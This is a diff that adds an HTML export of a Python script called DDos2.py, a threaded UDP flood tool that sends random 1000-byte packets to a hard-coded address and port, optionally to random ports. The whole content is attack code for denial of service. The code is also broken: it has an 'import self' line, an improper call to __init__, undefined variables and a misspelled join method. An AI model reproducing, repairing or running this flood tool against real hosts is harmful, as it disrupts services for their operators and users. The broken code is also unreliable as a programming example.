@@ -1,0 +1,54 @@
+<html>
+<head>
+<title>DDos2.py</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<style type="text/css">
+.s0 { color: #cc7832;}
+.s1 { color: #a9b7c6;}
+.s2 { color: #808080;}
+.s3 { color: #6a8759;}
+.s4 { color: #6897bb;}
+</style>
+</head>
+<body bgcolor="#2b2b2b">
+<table CELLSPACING=0 CELLPADDING=5 COLS=1 WIDTH="100%" BGCOLOR="#606060" >
+<tr><td><center>
+<font face="Arial, Helvetica" color="#000000">
+DDos2.py</font>
+</center></td></tr></table>
+<pre><span class="s0">import </span><span class="s1">random</span>
+<span class="s0">import </span><span class="s1">socket</span>
+<span class="s0">import </span><span class="s1">sys</span>
+<span class="s0">import </span><span class="s1">threading</span>
+<span class="s0">import </span><span class="s1">self</span>
+
+<span class="s2">#ip = &quot;192.168.32.100&quot;</span>
+<span class="s2">#port = 80</span>
+<span class="s2">#size = 1000</span>
+<span class="s2">#packets = 1000</span>
+
+<span class="s0">class </span><span class="s1">udpFlood(threading.Thread):</span>
+        <span class="s0">def </span><span class="s1">__init__(self</span><span class="s0">, </span><span class="s1">ip</span><span class="s0">, </span><span class="s1">port</span><span class="s0">, </span><span class="s1">size</span><span class="s0">, </span><span class="s1">packets):</span>
+                <span class="s1">self.ip = </span><span class="s3">&quot;192.168.32.100&quot;</span>
+                <span class="s1">self.port = </span><span class="s4">80</span>
+                <span class="s1">self.size = </span><span class="s4">1000</span>
+                <span class="s1">self.packets = </span><span class="s4">1000</span>
+                <span class="s1">self.udp = socket.socket(socket.AF_INET</span><span class="s0">,</span><span class="s1">socket.SOCK_DGRAM)</span>
+
+        <span class="s0">def </span><span class="s1">run(self):</span>
+            <span class="s0">for </span><span class="s1">i </span><span class="s0">in </span><span class="s1">range(self.packets):</span>
+                <span class="s0">try</span><span class="s1">:</span>
+                   <span class="s1">bytes_data = random._urandom(self.size)</span>
+                   <span class="s0">if </span><span class="s1">self.port == </span><span class="s4">0</span><span class="s1">:</span>
+                       <span class="s1">self.port = random.randrange(</span><span class="s4">1</span><span class="s0">, </span><span class="s4">65535</span><span class="s1">)</span>
+                   <span class="s1">self.udp.sendto(bytes_data</span><span class="s0">,</span><span class="s1">(self.ip</span><span class="s0">, </span><span class="s1">self.port))</span>
+                <span class="s0">except </span><span class="s1">Exception </span><span class="s0">as </span><span class="s1">e:</span>
+                     <span class="s1">print(</span><span class="s3">f&quot;errore invio pacchetto: </span><span class="s0">{</span><span class="s1">e</span><span class="s0">}</span><span class="s3">&quot;</span><span class="s1">)</span>
+
+<span class="s1">main = udpFlood.__init__(ip</span><span class="s0">, </span><span class="s1">port</span><span class="s0">, </span><span class="s1">size</span><span class="s0">, </span><span class="s1">packets)</span>
+<span class="s1">main.start()</span>
+<span class="s1">main.joint()</span>
+
+</pre>
+</body>
+</html>
